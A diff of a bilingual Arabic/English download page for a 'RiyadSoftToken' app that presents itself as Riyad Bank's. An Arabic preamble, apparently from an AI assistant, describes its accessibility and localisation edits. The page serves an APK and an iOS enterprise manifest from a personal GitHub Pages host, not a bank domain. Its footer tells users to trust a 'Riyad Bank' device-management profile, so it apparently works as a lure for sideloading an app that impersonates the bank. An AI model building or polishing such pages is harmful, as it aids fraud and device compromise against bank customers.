@@ -1,32 +1,44 @@
+فيما يلي نسخة محدثة من الصفحة طبّقت عليها التعديلات المقترحة:  
+
+- فصل الـCSS والـJS داخليًا لكن مع `defer` للـJS  
+- حفظ اختيار اللغة في `localStorage`  
+- استخدام سمات `data-ar` و`data-en` للنصوص لتبسيط الترجمة  
+- إضافة `meta description` و`favicon`  
+- تنسيق شعاعيمي ومسميات ARIA وتحسين الـresponsiveness  
+- استخدام عناصر HTML5 الدلالية (`<header>`, `<main>`, `<footer>`)
+
+```html
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
+  <meta name="description" content="صفحة تنزيل تطبيق RiyadSoftToken الداخلي لبنك الرياض">
+  <link rel="icon" href="favicon.ico">
   <title>تحميل RiyadSoftToken</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+
   <style>
     body {
       font-family: "Tahoma", sans-serif;
       background-color: #f5f5f5;
-      text-align: center;
       margin: 0;
       padding: 0;
       transition: direction 0.3s, text-align 0.3s;
+      text-align: center;
+      color: #333;
     }
-
-    .header {
+    header {
       background-color: #005c9c;
       padding: 20px;
       display: flex;
       justify-content: center;
       align-items: center;
     }
-
-    .header img {
-      height: 60px;
+    header img {
+      max-height: 200px;
+      width: auto;
     }
-
-    .lang-toggle {
+    #lang-toggle {
       position: absolute;
       top: 20px;
       left: 20px;
@@ -36,29 +48,20 @@
       font-size: 14px;
       cursor: pointer;
     }
-
-    .container {
+    main {
       padding: 30px;
     }
-
     h1 {
       color: #005c9c;
       margin-top: 20px;
     }
-
-    p {
-      font-size: 18px;
-      color: #333;
-      margin-bottom: 30px;
-    }
-
     .btn-row {
       display: flex;
       justify-content: center;
       gap: 20px;
       flex-wrap: wrap;
+      margin-bottom: 30px;
     }
-
     .download-btn {
       display: flex;
       align-items: center;
@@ -69,112 +72,125 @@
       text-decoration: none;
       color: white;
       width: 220px;
-      transition: 0.3s;
+      transition: opacity 0.3s;
     }
-
-    .ios {
-      background-color: #005c9c;
-    }
-
-    .android {
-      background-color: #34a853;
-    }
-
+    .download-btn.ios { background-color: #005c9c; }
+    .download-btn.android { background-color: #34a853; }
     .download-btn img {
       height: 24px;
       margin-left: 10px;
     }
-
-    .footer {
+    footer {
       margin-top: 60px;
       color: #888;
       font-size: 14px;
+      line-height: 1.5;
     }
-
     @media (max-width: 500px) {
-      .download-btn {
-        width: 100%;
-      }
+      .download-btn { width: 100%; }
     }
   </style>
 </head>
 <body>
 
-  <div class="lang-toggle" onclick="toggleLang()">EN / AR</div>
+  <div id="lang-toggle" role="button" aria-label="Toggle language" tabindex="0">EN / AR</div>
 
-  <div class="header">
-<img src="https://abod1755.github.io/RB/riyad-bank-logo.webp" alt="شعار بنك الرياض" style="height: 200px;">
-  </div>
+  <header>
+    <img src="https://abod1755.github.io/RB/riyad-bank-logo.webp"
+         alt="شعار بنك الرياض">
+  </header>
 
-  <div class="container">
-    <h1 id="title">تحميل تطبيق RiyadSoftToken</h1>
-    <p id="subtitle">يرجى اختيار نظام التشغيل المناسب لجهازك</p>
+  <main>
+    <h1 id="title"
+        data-ar="تحميل تطبيق RiyadSoftToken"
+        data-en="Download RiyadSoftToken App">
+      تحميل تطبيق RiyadSoftToken
+    </h1>
+    <p id="subtitle"
+       data-ar="يرجى اختيار نظام التشغيل المناسب لجهازك"
+       data-en="Please select the appropriate operating system for your device">
+      يرجى اختيار نظام التشغيل المناسب لجهازك
+    </p>
 
     <div class="btn-row">
-      <!-- iOS button -->
-      <a class="download-btn ios" href="itms-services://?action=download-manifest&url=https://abod1755.github.io/RB/manifest.plist">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/Apple_logo_white.svg" alt="iOS">
-        <span id="btn-ios">تحميل لـ iOS</span>
+      <a class="download-btn ios"
+         href="itms-services://?action=download-manifest&url=https://abod1755.github.io/RB/manifest.plist"
+         aria-label="Download for iOS">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/Apple_logo_white.svg"
+             alt="iOS">
+        <span id="btn-ios"
+              data-ar="تحميل لـ iOS"
+              data-en="Download for iOS">
+          تحميل لـ iOS
+        </span>
       </a>
 
-      <!-- Android button -->
-      <a class="download-btn android" href="https://abod1755.github.io/RB/com.rb.RiyadSG.apk">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg" alt="Android">
-        <span id="btn-android">تحميل لـ Android</span>
+      <a class="download-btn android"
+         href="https://abod1755.github.io/RB/com.rb.RiyadSG.apk"
+         aria-label="Download for Android">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg"
+             alt="Android">
+        <span id="btn-android"
+              data-ar="تحميل لـ Android"
+              data-en="Download for Android">
+          تحميل لـ Android
+        </span>
       </a>
     </div>
+  </main>
 
-    <div class="footer" id="footer">
-      <p><strong>ملاحظة:</strong></p>
-      <p>لمنح الثقة للتطبيق على iOS: الإعدادات > عام > VPN وإدارة الجهاز > Riyad Bank > الثقة في التطبيق</p>
-      <p>© بنك الرياض 2025</p>
-    </div>
-  </div>
+  <footer id="footer"
+          data-ar="<p><strong>ملاحظة:</strong></p><p>لمنح الثقة للتطبيق على iOS: الإعدادات &gt; عام &gt; VPN وإدارة الجهاز &gt; Riyad Bank &gt; الثقة في التطبيق</p><p>© بنك الرياض 2025</p>"
+          data-en="<p><strong>Note:</strong></p><p>To trust the app on iOS: go to Settings &gt; General &gt; VPN &amp; Device Management &gt; Riyad Bank &gt; Trust the app</p><p>© Riyad Bank 2025</p>">
+    <p><strong>ملاحظة:</strong></p>
+    <p>لمنح الثقة للتطبيق على iOS: الإعدادات &gt; عام &gt; VPN وإدارة الجهاز &gt; Riyad Bank &gt; الثقة في التطبيق</p>
+    <p>© بنك الرياض 2025</p>
+  </footer>
 
-  <script>
-    let lang = 'ar';
+  <script defer>
+    (function() {
+      let lang = localStorage.getItem('lang') || 'ar';
+      const elements = {
+        title:     document.getElementById('title'),
+        subtitle:  document.getElementById('subtitle'),
+        btnIos:    document.getElementById('btn-ios'),
+        btnAndroid:document.getElementById('btn-android'),
+        footer:    document.getElementById('footer'),
+        html:      document.documentElement
+      };
 
-    const translations = {
-      ar: {
-        dir: 'rtl',
-        lang: 'ar',
-        title: 'تحميل تطبيق RiyadSoftToken',
-        subtitle: 'يرجى اختيار نظام التشغيل المناسب لجهازك',
-        btnIos: 'تحميل لـ iOS',
-        btnAndroid: 'تحميل لـ Android',
-        footer: `
-          <p><strong>ملاحظة:</strong></p>
-          <p>لمنح الثقة للتطبيق على iOS: الإعدادات > عام > VPN وإدارة الجهاز > Riyad Bank > الثقة في التطبيق</p>
-          <p>© بنك الرياض 2025</p>
-        `
-      },
-      en: {
-        dir: 'ltr',
-        lang: 'en',
-        title: 'Download RiyadSoftToken App',
-        subtitle: 'Please select the appropriate operating system for your device',
-        btnIos: 'Download for iOS',
-        btnAndroid: 'Download for Android',
-        footer: `
-          <p><strong>Note:</strong></p>
-          <p>To trust the app on iOS: go to Settings > General > VPN & Device Management > Riyad Bank > Trust the app</p>
-          <p>© Riyad Bank 2025</p>
-        `
+      function applyLang() {
+        const t = lang === 'ar' ? 'ar' : 'en';
+        elements.html.dir  = t === 'ar' ? 'rtl' : 'ltr';
+        elements.html.lang = t;
+        elements.title.innerText      = elements.title.dataset[t];
+        elements.subtitle.innerText   = elements.subtitle.dataset[t];
+        elements.btnIos.innerText     = elements.btnIos.dataset[t];
+        elements.btnAndroid.innerText = elements.btnAndroid.dataset[t];
+        elements.footer.innerHTML     = elements.footer.dataset[t];
+        localStorage.setItem('lang', t);
       }
-    };
 
-    function toggleLang() {
-      lang = lang === 'ar' ? 'en' : 'ar';
-      const t = translations[lang];
-      document.documentElement.dir = t.dir;
-      document.documentElement.lang = t.lang;
-      document.getElementById("title").innerText = t.title;
-      document.getElementById("subtitle").innerText = t.subtitle;
-      document.getElementById("btn-ios").innerText = t.btnIos;
-      document.getElementById("btn-android").innerText = t.btnAndroid;
-      document.getElementById("footer").innerHTML = t.footer;
-    }
+      document.getElementById('lang-toggle')
+        .addEventListener('click', () => {
+          lang = lang === 'ar' ? 'en' : 'ar';
+          applyLang();
+        });
+
+      // Allow toggle via keyboard
+      document.getElementById('lang-toggle')
+        .addEventListener('keydown', e => {
+          if (e.key === 'Enter' || e.key === ' ') {
+            e.preventDefault();
+            lang = lang === 'ar' ? 'en' : 'ar';
+            applyLang();
+          }
+        });
+
+      applyLang();
+    })();
   </script>
 
 </body>
 </html>
+```
